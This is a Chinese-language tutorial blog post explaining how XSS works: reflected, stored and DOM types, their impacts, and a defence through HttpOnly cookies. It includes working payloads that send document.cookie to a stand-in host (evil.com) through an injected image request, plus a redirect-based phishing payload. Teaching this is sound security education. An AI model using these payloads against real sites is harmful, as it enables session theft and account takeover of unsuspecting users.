---
title: XSS学习系列Chapter 2：漏洞原理
date: 2019-03-11 09:42:09
tags: 
	- XSS
categories: WEB漏洞学习
---

## 一、概述

### 0x00 什么是XSS漏洞？

> XSS，即跨站脚本（Cross Site Script），是由于网站对用户输入过滤不严而造成的漏洞。攻击者可以通过提交恶意JS代码，把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码导致被攻击。

<!-- more -->

### 0x01 XSS分类

**1.反射型XSS**

> 只是简单地把用户输入的数据”反射”给浏览器，攻击时需要诱骗用户点击恶意链接，也叫”非持久型XSS”。

**2.存储型XSS**

> 会把用户输入的数据”存储”在服务器端，也叫”持久性XSS”。常见于留言板、博客文章等可以提交并展示用户输入内容的功能点。

**3.DOM XSS**

> DOM XSS是由于前端的JS操作DOM时存在漏洞。
>
> 与前两种的主要区别在于，DOM XSS是不与服务端交互的，触发XSS靠的只是客户端DOM解析，DOM XSS是在浏览器的解析中改变页面DOM树，且恶意代码并不在返回页面源码中回显。

### 0x02 XSS特点

1. 是一种攻击客户端的漏洞，而不是攻击服务器的漏洞。
2. 反射型XSS与存储型XSS都先与服务器交互后返回，DOM XSS是不需要服务器参与的。

### 0x03 XSS危害

> 理论上，只要是JavaScript脚本能做的功能，XSS Payload都能做到。

- 窃取Cookie
- 钓鱼攻击
- 网页篡改、挂马
- DoS攻击
- XSS传播蠕虫
- 发起指定的GET/POST请求
- 结合CSRF漏洞进行攻击
- ......

## 二、XSS漏洞利用

### 0x00 窃取Cookie

**1.前瞻知识**

- `document.cookie`可以获取到当前用户在当前网站的Cookie值。
- `escape()`函数用于构建合理的URL（对给定的URL进行URL编码使其符合规定）。

**2.漏洞利用脚本：**

```javascript
var img = document.createElement('img'); 
img.src='http://www.evil.com/no.php?'+escape(document.cookie);
document.body.appendChild(img);
```

脚本原理：创建一个用于请求图片的`<img>`标签，该标签会向`src`属性指定的URL发起一次GET请求，我们让其`src`向我们的服务器发起一次GET并且让其携带Cookie作为参数。若脚本被加载并执行成功，我们通过查看我们的服务器`access.log`日志就能看到Cookie。也可以编写一个页面来接收Payload发送的Cookie参数。

**3.其他漏洞利用代码：**

- `<img src="http://www.evil.com?cookie='+document.cookie"></img>`
- `<script>new Image().src="http://www.evil.com?cookie="+document.cookie;</script>`

**4.窃取其他信息**

- `navigator.userAgent`读取客户端UA。

**5.防御**

在Set-Cookie时设置Http-Only标识，设置后将不允许JavaScript读取Cookie。

### 0x01 钓鱼攻击

**1.重定向钓鱼**

> `<script>document.location.href="http://www.evil.com"</script>`

**2.iframe**

通过JavaScript来添加一个新的`<iframe>`标签嵌入第三方域的内容(钓鱼网页)，此时主页面仍处于正常页面下，具有极高的迷惑性。

### 0x02 其他利用

参考链接：

http://wps2015.org/2016/12/12/usually-used-xss-code/

https://bbs.ichunqiu.com/thread-25578-1-1.html?from=sec

## 三、XSS Check Cheatsheet

http://momomoxiaoxi.com/2017/10/10/XSS/

https://github.com/s0md3v/AwesomeXSS